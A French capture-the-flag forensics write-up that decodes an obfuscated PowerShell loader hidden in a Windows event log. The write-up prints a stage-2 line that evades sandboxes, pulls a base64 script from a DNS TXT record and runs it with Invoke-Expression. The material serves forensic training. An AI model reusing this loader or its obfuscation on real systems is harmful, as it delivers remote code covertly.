# Texas Chainsaw Massacre: Tokyo Drift

__author__: resume

__synopsis__: Ugh! One of our users was trying to install a Texas Chainsaw Massacre video game, and installed malware instead. Our EDR detected a rogue process reading and writing events to the Application event log. Luckily, it killed the process and everything seems fine, but we don't know what it was doing in the event log.

The EVTX file is attached. Are you able to find anything malicious?  

__Attachements__: ChainsawMassacre.zip

---

Un peu triste de l'avoir solve **après** le CTF, mais cela me servira sur de prochaines compétitions.

Dans le zip, nous allons trouver un fichier EVTX, qui est le format des logs système de Microsoft.

```bash
unzip -l ChainsawMassacre.zip
Archive:  ChainsawMassacre.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
  1118208  2023-10-10 12:43   Application Logs.evtx
---------                     -------
  1118208                     1 file
```

Sous linux, ce fichier n'est pas exploitable, à moins le le convertir dans un format plus lisible.

Pour cela, nous allons utiliser **evtx_dump.py** pour le transformer au format XML.

```xml
<?xml version="1.1" encoding="utf-8" standalone="yes" ?>

<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-CAPI2" Guid="{5bbca4a8-b209-48dc-a8c7-b23d3e5216fb}" EventSourceName="Microsoft-Windows-CAPI2"></Provider>
<EventID Qualifiers="0">4097</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8080000000000000</Keywords>
<TimeCreated SystemTime="2023-10-10 15:54:18.664185"></TimeCreated>
<EventRecordID>1720</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="1132" ThreadID="1884"></Execution>
<Channel>Application</Channel>
<Computer>DESKTOP-JU2PNRI</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data>&lt;string&gt;CN=GlobalSign Root CA, OU=Root CA, O=GlobalSign nv-sa, C=BE&lt;/string&gt;
&lt;string&gt;B1BC968BD4F49D622AA89A81F2150152A41D829C&lt;/string&gt;
</Data>
<Binary></Binary>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-CAPI2" Guid="{5bbca4a8-b209-48dc-a8c7-b23d3e5216fb}" EventSourceName="Microsoft-Windows-CAPI2"></Provider>
<EventID Qualifiers="0">4097</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8080000000000000</Keywords>
<TimeCreated SystemTime="2023-10-10 15:54:21.410805"></TimeCreated>
<EventRecordID>1721</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="1132" ThreadID="1884"></Execution>
<Channel>Application</Channel>
<Computer>DESKTOP-JU2PNRI</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data>&lt;string&gt;OU=Starfield Class 2 Certification Authority, O="Starfield Technologies, Inc.", C=US&lt;/string&gt;
&lt;string&gt;AD7E1C28B064EF8F6003402014C3D0E3370EB58A&lt;/string&gt;
</Data>
<Binary></Binary>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-CAPI2" Guid="{5bbca4a8-b209-48dc-a8c7-b23d3e5216fb}" EventSourceName="Microsoft-Windows-CAPI2"></Provider>
<EventID Qualifiers="0">4097</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x8080000000000000</Keywords>
<TimeCreated SystemTime="2023-10-10 15:54:22.143524"></TimeCreated>
<EventRecordID>1722</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="1132" ThreadID="1884"></Execution>
<Channel>Application</Channel>
<Computer>DESKTOP-JU2PNRI</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data>&lt;string&gt;CN=VeriSign Universal Root Certification Authority, OU="(c) 2008 VeriSign, Inc. - For authorized use only", OU=VeriSign Trust Network, O="VeriSign, Inc.", C=US&lt;/string&gt;
&lt;string&gt;3679CA35668772304D30A5FB873B0FA77BB70D54&lt;/string&gt;
</Data>
<Binary></Binary>
</EventData>
</Event>
[…]
```

On dump le XML dans un fichier, et nous allons ensuite Grep la chane "Texas" pour trouver notre application:

```bash
grep -iE "texas" some.xml
<EventData><Data>&lt;string&gt;CN=SSL.com Root Certification Authority RSA, O=SSL Corporation, L=Houston, S=Texas, C=US&lt;/string&gt;
<EventData><Data>&lt;string&gt;Windows Installer installed the product. Product Name: The Texas Chain Saw Massacre (1974). Product Version: 8.0.382.5. Product Language: English. Director: Tobe Hooper. Installation success or error status: 0.&lt;/string&gt;
```

Nous avons deux réponse, la première est celle d'un certificate d'autorité, la seconde est le logiciel que l'utilisateur à essayé d'exécuter.

Une petite recherche dans le XML pour notre application:

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="MsiInstaller"></Provider>
<EventID Qualifiers="0">1337</EventID>
<Version>0</Version>
<Level>4</Level>
<Task>0</Task>
<Opcode>0</Opcode>
<Keywords>0x0080000000000000</Keywords>
<TimeCreated SystemTime="2023-10-10 16:02:47.088024"></TimeCreated>
<EventRecordID>1785</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="9488" ThreadID="0"></Execution>
<Channel>Application</Channel>
<Computer>DESKTOP-JU2PNRI</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data>&lt;string&gt;WindowsInstallerinstalledtheproduct.ProductName:TheTexasChainSawMassacre(1974).ProductVersion:8.0.382.5.ProductLanguage:English.Director:TobeHooper.Installationsuccessorerrorstatus:0.&lt;/string&gt;
</Data>
<Binary>KCgnLiAoIFpUNkVOdjpDb01TcEVjWzQsMjQsJysnMjVdLWpvaW5oeDZoeDYpKCBhNlQgWlQ2KCBTZXQtdmFyaWFCbGUgaHg2T2ZTaHg2IGh4Nmh4NilhNlQrICggW1N0cmlOZycrJ10gW3JFR2VYXTo6bUF0Y2hlUyggYTZUICkpNDIxXVJBaENbLGh4NmZLSWh4NmVDQUxQZVItICA5M11SQWhDWywpODldUkFoQ1srODRdUkFoQ1srOThdUkFoQ1soIEVjYWxQZVJDLSAgNjNdUkFoQ1ssaHg2a3dsaHg2RWNhbFBlUkMtICApaHg2KWJoeDYraHg2MFliMFloeDYraHg2bmlPai1dNTIsaHg2K2h4NjQyLGh4NisnKydoeDY0W2NlaHg2K2h4NnBoeDYraHg2U01vQzpWbmh4NitoeDZla3dsICggaHg2K2h4Ni4gZktJICkgKERuRU9UREFoeDYraHg2ZWh4NitoeDZyLil9ICkgaHg2KycrJ2h4NmlpY3NBOmh4NitoeDY6XUduaWRPY05oeDYraHg2ZS5oeDYraHg2VGh4NitoeDZ4ZXRoeDYraHg2Lmh4NitoeDZNRVRzeXNbaHg2K2h4NiAsX2t3aHg2K2gnKyd4NmwgKFJFRGh4NitoeDZBZVJtYWVydFMubycrJ0loeDYraHg2IHRoeDYraHg2Q2h4NicrJytoeDZlamJPLVdoJysneDYraHg2RW4geyBIQ2FFUm9GaHg2K2h4NmZLSSkgc1NFUnBNJysnb0NlaHg2K2h4JysnNmRoeDYraHg2OjpoeDYraHg2XScrJ2VkT01oeDYraHg2Jysnbk9pc1NFclBNb2NoeDYraHg2Lk5vSVNTZXJoeDYraHg2cE1PYy5vaVssICkgYicrJzBZaHg2K2h4Nj09d0R5RDRwK1MnKydzL2wvaHg2K2h4NmkrNUd0YXRKS3lmTmpPaHg2KycrJ2h4NjNoeDYraHg2M2h4NitoeDY0Vmh4NitoeDZ2ajZ3UnlSWGUxeHkxcEIwaHg2K2h4NkFYVkxNZ093WWh4NitoeDYvL2h4NitoeDZXb21oeDYraHg2eicrJ3pVaHg2K2h4NnRCaHg2K2h4NnN4L2llMHJWWjdoeDYraHg2eGNMaW93V01HRVZqazdKTWZ4Vm11c3poeDYraHg2T1QzWGtLdTlUdk9zcmh4NitoeDZiYmh4NitoeDZjYmh4NitoeDZHeVo2Yy9nWWh4NitoeDZOcGlsaHg2K2h4NkJLN3g1aHg2K2h4NlBsY2h4NitoeDY4cVV5T2hCWWh4NitoeDZWZWNqTkxXNDJZak04U3d0QWh4NitoeDZhUjhJaHg2K2h4Nk9oeDYraHg2d2h4NitoeDZtaHg2K2h4NjZoeDYraHg2VXdXTm1XekN3JysnaHg2K2h4NlZyU2h4NitoeDZyN0loeDYraHg2VDJoeDYraHg2azZNajFNdWh4NitoeDZLaHg2K2h4NlQnKycvb1JoeDYraHg2TzVCS0s4UjNOaERoeDYraHg2b20yQWh4NitoeDZHWXBoeDYraHg2eWFoeDYraHg2VGFOZzhEQW5lTm9lU2poeDYraCcrJ3g2dWdrVEJGVGNDUGFTSDBRanBGeXdoeDYrJysnaHg2YVF5aHgnKyc2K2h4Nkh0UFVHJysnaHgnKyc2K2h4NkRMMEJLM2h4NitoJysneDZsQ2xySEF2aHg2K2gnKyd4NjRHT3BWS2h4NitoeDZVTmh4NitoeDZtR3pJRGVyYUV2bHBjJysna0M5RUdoeDYraHg2Z0lhZjk2alNtU2h4NicrJytoeDZNaGh4NitoeDZoaHg2K2h4NlJmSTcyaHg2K2h4Nm9IelVrRHNab1Q1aHg2K2h4Nm5oeDYraHg2YzdNRDhXMzFYcScrJ0toeDYraHg2ZDRkYnRoeDYraHg2YnRoMVJkU2lnRWFFaHg2K2h4NkpORVJNTFV4VicrJ2h4NitoeDZNRTRQSnRVaHg2K2h4NnRTSUpVWmZaaHg2K2h4NkVFaHg2K2h4NkFoeDYraHg2SnNUZERaTmJoeDYraHg2MFkoZ25pUlRTNGh4NitoeDY2ZXNoJysneDYraHg2YUJtb1JGOjpddFJldm5PaHg2K2h4NkNbXU1BZXJ0c1lyT21lTS5PaS5tRVRTWXNbIChNYUVyaHg2K2h4NnRoeDYraHg2c0V0QUxmZUQuTk9oeDYraHg2SXNTJysnZXJQbW8nKydjLk9JLm1laHg2K2h4NlRzWVNoeDYnKycraHg2IGh4NitoeDYgdENlamJPLVdFaHg2K2h4Nm4gKCBoeDYoKChubycrJ0lzc2VScFgnKydlLWVrb3ZuaSBhNlQsaHg2Lmh4NixoeDZSaWdodFRvTEVGdGh4NiApIFJZY2ZvckVhY2h7WlQ2XyB9KSthNlQgWlQ2KCBzViBoeDZvRnNoeDYgaHg2IGh4NilhNlQgKSAnKSAgLWNSRXBMQUNFIChbY0hBcl05MCtbY0hBcl04NCtbY0hBcl01NCksW2NIQXJdMzYgLXJFUGxBY2UnYTZUJyxbY0hBcl0zNCAgLXJFUGxBY2UgICdSWWMnLFtjSEFyXTEyNCAtY1JFcExBQ0UgIChbY0hBcl0xMDQrW2NIQXJdMTIwK1tjSEFyXTU0KSxbY0hBcl0zOSkgfC4gKCAkdkVSYm9TRXByZUZlUmVuQ2UudE9TdHJJTkcoKVsxLDNdKyd4Jy1KT2luJycp</Binary>
</EventData>
</Event>
```

La balise Binary contient une chaine en base64, nous allons donc la reverse pour avoir ce qui a été commandé à l'ordinateur:

```bash
echo "KCgnLiAoIFpUNkVOdjpDb01TcEVjWzQsMjQsJysnMjVdLWpvaW5oeDZoeDYpKCBhNlQgWlQ2KCBTZXQtdmFyaWFCbGUgaHg2T2ZTaHg2IGh4Nmh4NilhNlQrICggW1N0cmlOZycrJ10gW3JFR2VYXTo6bUF0Y2hlUyggYTZUICkpNDIxXVJBaENbLGh4NmZLSWh4NmVDQUxQZVItICA5M11SQWhDWywpODldUkFoQ1srODRdUkFoQ1srOThdUkFoQ1soIEVjYWxQZVJDLSAgNjNdUkFoQ1ssaHg2a3dsaHg2RWNhbFBlUkMtICApaHg2KWJoeDYraHg2MFliMFloeDYraHg2bmlPai1dNTIsaHg2K2h4NjQyLGh4NisnKydoeDY0W2NlaHg2K2h4NnBoeDYraHg2U01vQzpWbmh4NitoeDZla3dsICggaHg2K2h4Ni4gZktJICkgKERuRU9UREFoeDYraHg2ZWh4NitoeDZyLil9ICkgaHg2KycrJ2h4NmlpY3NBOmh4NitoeDY6XUduaWRPY05oeDYraHg2ZS5oeDYraHg2VGh4NitoeDZ4ZXRoeDYraHg2Lmh4NitoeDZNRVRzeXNbaHg2K2h4NiAsX2t3aHg2K2gnKyd4NmwgKFJFRGh4NitoeDZBZVJtYWVydFMubycrJ0loeDYraHg2IHRoeDYraHg2Q2h4NicrJytoeDZlamJPLVdoJysneDYraHg2RW4geyBIQ2FFUm9GaHg2K2h4NmZLSSkgc1NFUnBNJysnb0NlaHg2K2h4JysnNmRoeDYraHg2OjpoeDYraHg2XScrJ2VkT01oeDYraHg2Jysnbk9pc1NFclBNb2NoeDYraHg2Lk5vSVNTZXJoeDYraHg2cE1PYy5vaVssICkgYicrJzBZaHg2K2h4Nj09d0R5RDRwK1MnKydzL2wvaHg2K2h4NmkrNUd0YXRKS3lmTmpPaHg2KycrJ2h4NjNoeDYraHg2M2h4NitoeDY0Vmh4NitoeDZ2ajZ3UnlSWGUxeHkxcEIwaHg2K2h4NkFYVkxNZ093WWh4NitoeDYvL2h4NitoeDZXb21oeDYraHg2eicrJ3pVaHg2K2h4NnRCaHg2K2h4NnN4L2llMHJWWjdoeDYraHg2eGNMaW93V01HRVZqazdKTWZ4Vm11c3poeDYraHg2T1QzWGtLdTlUdk9zcmh4NitoeDZiYmh4NitoeDZjYmh4NitoeDZHeVo2Yy9nWWh4NitoeDZOcGlsaHg2K2h4NkJLN3g1aHg2K2h4NlBsY2h4NitoeDY4cVV5T2hCWWh4NitoeDZWZWNqTkxXNDJZak04U3d0QWh4NitoeDZhUjhJaHg2K2h4Nk9oeDYraHg2d2h4NitoeDZtaHg2K2h4NjZoeDYraHg2VXdXTm1XekN3JysnaHg2K2h4NlZyU2h4NitoeDZyN0loeDYraHg2VDJoeDYraHg2azZNajFNdWh4NitoeDZLaHg2K2h4NlQnKycvb1JoeDYraHg2TzVCS0s4UjNOaERoeDYraHg2b20yQWh4NitoeDZHWXBoeDYraHg2eWFoeDYraHg2VGFOZzhEQW5lTm9lU2poeDYraCcrJ3g2dWdrVEJGVGNDUGFTSDBRanBGeXdoeDYrJysnaHg2YVF5aHgnKyc2K2h4Nkh0UFVHJysnaHgnKyc2K2h4NkRMMEJLM2h4NitoJysneDZsQ2xySEF2aHg2K2gnKyd4NjRHT3BWS2h4NitoeDZVTmh4NitoeDZtR3pJRGVyYUV2bHBjJysna0M5RUdoeDYraHg2Z0lhZjk2alNtU2h4NicrJytoeDZNaGh4NitoeDZoaHg2K2h4NlJmSTcyaHg2K2h4Nm9IelVrRHNab1Q1aHg2K2h4Nm5oeDYraHg2YzdNRDhXMzFYcScrJ0toeDYraHg2ZDRkYnRoeDYraHg2YnRoMVJkU2lnRWFFaHg2K2h4NkpORVJNTFV4VicrJ2h4NitoeDZNRTRQSnRVaHg2K2h4NnRTSUpVWmZaaHg2K2h4NkVFaHg2K2h4NkFoeDYraHg2SnNUZERaTmJoeDYraHg2MFkoZ25pUlRTNGh4NitoeDY2ZXNoJysneDYraHg2YUJtb1JGOjpddFJldm5PaHg2K2h4NkNbXU1BZXJ0c1lyT21lTS5PaS5tRVRTWXNbIChNYUVyaHg2K2h4NnRoeDYraHg2c0V0QUxmZUQuTk9oeDYraHg2SXNTJysnZXJQbW8nKydjLk9JLm1laHg2K2h4NlRzWVNoeDYnKycraHg2IGh4NitoeDYgdENlamJPLVdFaHg2K2h4Nm4gKCBoeDYoKChubycrJ0lzc2VScFgnKydlLWVrb3ZuaSBhNlQsaHg2Lmh4NixoeDZSaWdodFRvTEVGdGh4NiApIFJZY2ZvckVhY2h7WlQ2XyB9KSthNlQgWlQ2KCBzViBoeDZvRnNoeDYgaHg2IGh4NilhNlQgKSAnKSAgLWNSRXBMQUNFIChbY0hBcl05MCtbY0hBcl04NCtbY0hBcl01NCksW2NIQXJdMzYgLXJFUGxBY2UnYTZUJyxbY0hBcl0zNCAgLXJFUGxBY2UgICdSWWMnLFtjSEFyXTEyNCAtY1JFcExBQ0UgIChbY0hBcl0xMDQrW2NIQXJdMTIwK1tjSEFyXTU0KSxbY0hBcl0zOSkgfC4gKCAkdkVSYm9TRXByZUZlUmVuQ2UudE9TdHJJTkcoKVsxLDNdKyd4Jy1KT2luJycp" | base64 -d
```

Ce qui va vous afficher le script powershell suivant:

```ps1
(('. ( ZT6ENv:CoMSpEc[4,24,'+'25]-joinhx6hx6)( a6T ZT6( Set-variaBle hx6OfShx6 hx6hx6)a6T+ ( [StriNg'+'] [rEGeX]::mAtcheS( a6T ))421]RAhC[,hx6fKIhx6eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,hx6kwlhx6EcalPeRC-  )hx6)bhx6+hx60Yb0Yhx6+hx6niOj-]52,hx6+hx642,hx6+'+'hx64[cehx6+hx6phx6+hx6SMoC:Vnhx6+hx6ekwl ( hx6+hx6. fKI ) (DnEOTDAhx6+hx6ehx6+hx6r.)} ) hx6+'+'hx6iicsA:hx6+hx6:]GnidOcNhx6+hx6e.hx6+hx6Thx6+hx6xethx6+hx6.hx6+hx6METsys[hx6+hx6 ,_kwhx6+h'+'x6l (REDhx6+hx6AeRmaertS.o'+'Ihx6+hx6 thx6+hx6Chx6'+'+hx6ejbO-Wh'+'x6+hx6En { HCaERoFhx6+hx6fKI) sSERpM'+'oCehx6+hx'+'6dhx6+hx6::hx6+hx6]'+'edOMhx6+hx6'+'nOisSErPMochx6+hx6.NoISSerhx6+hx6pMOc.oi[, ) b'+'0Yhx6+hx6==wDyD4p+S'+'s/l/hx6+hx6i+5GtatJKyfNjOhx6+'+'hx63hx6+hx63hx6+hx64Vhx6+hx6vj6wRyRXe1xy1pB0hx6+hx6AXVLMgOwYhx6+hx6//hx6+hx6Womhx6+hx6z'+'zUhx6+hx6tBhx6+hx6sx/ie0rVZ7hx6+hx6xcLiowWMGEVjk7JMfxVmuszhx6+hx6OT3XkKu9TvOsrhx6+hx6bbhx6+hx6cbhx6+hx6GyZ6c/gYhx6+hx6Npilhx6+hx6BK7x5hx6+hx6Plchx6+hx68qUyOhBYhx6+hx6VecjNLW42YjM8SwtAhx6+hx6aR8Ihx6+hx6Ohx6+hx6whx6+hx6mhx6+hx66hx6+hx6UwWNmWzCw'+'hx6+hx6VrShx6+hx6r7Ihx6+hx6T2hx6+hx6k6Mj1Muhx6+hx6Khx6+hx6T'+'/oRhx6+hx6O5BKK8R3NhDhx6+hx6om2Ahx6+hx6GYphx6+hx6yahx6+hx6TaNg8DAneNoeSjhx6+h'+'x6ugkTBFTcCPaSH0QjpFywhx6+'+'hx6aQyhx'+'6+hx6HtPUG'+'hx'+'6+hx6DL0BK3hx6+h'+'x6lClrHAvhx6+h'+'x64GOpVKhx6+hx6UNhx6+hx6mGzIDeraEvlpc'+'kC9EGhx6+hx6gIaf96jSmShx6'+'+hx6Mhhx6+hx6hhx6+hx6RfI72hx6+hx6oHzUkDsZoT5hx6+hx6nhx6+hx6c7MD8W31Xq'+'Khx6+hx6d4dbthx6+hx6bth1RdSigEaEhx6+hx6JNERMLUxV'+'hx6+hx6ME4PJtUhx6+hx6tSIJUZfZhx6+hx6EEhx6+hx6Ahx6+hx6JsTdDZNbhx6+hx60Y(gniRTS4hx6+hx66esh'+'x6+hx6aBmoRF::]tRevnOhx6+hx6C[]MAertsYrOmeM.Oi.mETSYs[ (MaErhx6+hx6thx6+hx6sEtALfeD.NOhx6+hx6IsS'+'erPmo'+'c.OI.mehx6+hx6TsYShx6'+'+hx6 hx6+hx6 tCejbO-WEhx6+hx6n ( hx6(((no'+'IsseRpX'+'e-ekovni a6T,hx6.hx6,hx6RightToLEFthx6 ) RYcforEach{ZT6_ })+a6T ZT6( sV hx6oFshx6 hx6 hx6)a6T ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')
```

C'est impcompréhensible, car le script a été obfusqué, nous allons devoir le nettoyer, ce qui vous donnera au final:

```ps1
(('. ( $ENv:CoMSpEc[4,24,'+'25]-join'')( " $( Set-variaBle 'OfS' '')"+ ( [StriNg'+'] [rEGeX]::mAtcheS( " ))421]RAhC[,'fKI'eCALPeR-  93]RAhC[,)89]RAhC[+84]RAhC[+98]RAhC[( EcalPeRC-  63]RAhC[,'kwl'EcalPeRC-  )')b'+'0Yb0Y'+'niOj-]52,'+'42,'+'+''4[ce'+'p'+'SMoC:Vn'+'ekwl ( '+'. fKI ) (DnEOTDA'+'e'+'r.)} ) '+'+''iicsA:'+':]GnidOcN'+'e.'+'T'+'xet'+'.'+'METsys['+' ,_kw'+h'+'x6l (RED'+'AeRmaertS.o'+'I'+' t'+'C''+'+'ejbO-Wh'+'x6+'En { HCaERoF'+'fKI) sSERpM'+'oCe'+hx'+'6d'+'::'+']'+'edOM'+''+'nOisSErPMoc'+'.NoISSer'+'pMOc.oi[, ) b'+'0Y'+'==wDyD4p+S'+'s/l/'+'i+5GtatJKyfNjO'+'+''3'+'3'+'4V'+'vj6wRyRXe1xy1pB0'+'AXVLMgOwY'+'//'+'Wom'+'z'+'zU'+'tB'+'sx/ie0rVZ7'+'xcLiowWMGEVjk7JMfxVmusz'+'OT3XkKu9TvOsr'+'bb'+'cb'+'GyZ6c/gY'+'Npil'+'BK7x5'+'Plc'+'8qUyOhBY'+'VecjNLW42YjM8SwtA'+'aR8I'+'O'+'w'+'m'+'6'+'UwWNmWzCw'+''+'VrS'+'r7I'+'T2'+'k6Mj1Mu'+'K'+'T'+'/oR'+'O5BKK8R3NhD'+'om2A'+'GYp'+'ya'+'TaNg8DAneNoeSj'+h'+'x6ugkTBFTcCPaSH0QjpFyw'+'+''aQyhx'+'6+'HtPUG'+'hx'+'6+'DL0BK3'+h'+'x6lClrHAv'+h'+'x64GOpVK'+'UN'+'mGzIDeraEvlpc'+'kC9EG'+'gIaf96jSmS''+'+'Mh'+'h'+'RfI72'+'oHzUkDsZoT5'+'n'+'c7MD8W31Xq'+'K'+'d4dbt'+'bth1RdSigEaE'+'JNERMLUxV'+''+'ME4PJtU'+'tSIJUZfZ'+'EE'+'A'+'JsTdDZNb'+'0Y(gniRTS4'+'6esh'+'x6+'aBmoRF::]tRevnO'+'C[]MAertsYrOmeM.Oi.mETSYs[ (MaEr'+'t'+'sEtALfeD.NO'+'IsS'+'erPmo'+'c.OI.me'+'TsYS''+'+' '+' tCejbO-WE'+'n ( '(((no'+'IsseRpX'+'e-ekovni ",'.','RightToLEFt' ) |forEach{$_ })+" $( sV 'oFs' ' ')" ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'a6T',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')
```

Nous pouvons le simplifier comme ceci:

```ps1
(('s ( $ENv:CoMSpEc[4,24,25]-join'')( " $( Set-variaBle 'OfS' '')"+ ( [StriNg] [rEGeX]::mAtcheS( " )','.'," invoke-eXpRessIon(((' ( nEW-ObjeCt  SYsTem.IO.comPreSsION.DefLAtEstrEaM( [sYSTEm.iO.MemOrYstreAM][COnveRt]::FRomBase64STRing('NZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhMSmSj69faIgGE9CkcplvEareDIzGmNUKVpOG4vAHrlCl3KB0LDGUPtHyQawyFpjQ0HSaPCcTFBTkgujSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433OjNfyKJtatG5+i/l/sS+p4DyDw==' ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::deCoMpRESs )|FoREaCH { nEW-ObjeCt Io.StreamReADER( $_, [sysTEM.texT.eNcOdinG]::Ascii ) }).reADTOEnD( ) | . ( $enV:CoMSpec[4,24,25]-jOin'')')  -CRePlacE'$',[ChAR]36  -CRePlacE ([ChAR]89+[ChAR]48+[ChAR]98),[ChAR]39  -RePLACe'IKf',[ChAR]124)RightToLEFt' ) |forEach{$_ })+" $( sV 'oFs' ' ')" ) ')  -cREpLACE ([cHAr]90+[cHAr]84+[cHAr]54),[cHAr]36 -rEPlAce'A6t',[cHAr]34  -rEPlAce  'RYc',[cHAr]124 -cREpLACE  ([cHAr]104+[cHAr]120+[cHAr]54),[cHAr]39) |. ( $vERboSEpreFeRenCe.tOStrING()[1,3]+'x'-JOin'')
```

La partie la plus importante du script est celle qui va charger en mémoire et reverse la chaine en base64:

```ps1
( nEW-ObjeCt  SYsTem.IO.comPreSsION.DefLAtEstrEaM( [sYSTEm.iO.MemOrYstreAM][COnveRt]::FRomBase64STRing('NZDdTsJAEEZfZUJIStUtJP4EMVxULMRENJEaEgiSdR1htbtbd4dKqX13W8DM7cn5ToZsDkUzHo27IfRhhMSmSj69faIgGE9CkcplvEareDIzGmNUKVpOG4vAHrlCl3KB0LDGUPtHyQawyFpjQ0HSaPCcTFBTkgujSeoNenAD8gNaTaypYGA2moDhN3R8KKB5ORo/TKuM1jM6k2TI7rSrVwCzWmNWwU6mwOI8RaAtwS8MjY24WLNjceVYBhOyUq8clP5x7KBlipNYg/c6ZyGbcbbrsOvT9uKkX3TOzsumVxfMJ7kjVEGMWwoiLcx7ZVr0ei/xsBtUzzmoW//YwOgMLVXA0Bp1yx1eXRyRw6jvV433OjNfyKJtatG5+i/l/sS+p4DyDw==' ) ,[io.cOMpreSSIoN.coMPrESsiOnMOde]::deCoMpRESs )|FoREaCH { nEW-ObjeCt Io.StreamReADER( $_, [sysTEM.texT.eNcOdinG]::Ascii ) }).reADTOEnD( )
```

Une fois que vous exécutez cela dans un IDE (powershell ou tio.run par exemple), vous allez avoir le stage 2 qui va apparaitre:

```ps1
try {$TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue' ; if ($error.Count -eq 0) { $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression } } } catch { }
```

Le stage2 peut faire peur, mais au final, il est extrêmement simple à comprendre, en effet, il se réduit à une résolution DNS pour récupérer un champ TXT d'un domaine.

Pour ce faire après le CTF, vous pouvez passer par un site qui conserve les historiques DNS d'un domaine, je suis passé par [dnshistory.org](https://dnshistory.org/historical-dns-records/txt/eventlog.zip) pour retrouver la chaine en base64:

```
U3RhcnQtUHJvY2VzcyAiaHR0cHM6Ly95b3V0dS5iZS81NjFubmQ5RWJzcz90PTE2IgojZmxhZ3s0MDk1MzczNDdjMmZhZTAxZWY5ODI2YzI1MDZhYzY2MH0jCg==
```

Une fois décodée, elle vous donnait le flag:

```bash
echo "U3RhcnQtUHJvY2VzcyAiaHR0cHM6Ly95b3V0dS5iZS81NjFubmQ5RWJzcz90PTE2IgojZmxhZ3s0MDk1MzczNDdjMmZhZTAxZWY5ODI2YzI1MDZhYzY2MH0jCg==" | base64 -d
Start-Process "https://youtu.be/561nnd9Ebss?t=16"
#flag{409537347c2fae01ef9826c2506ac660}#
```
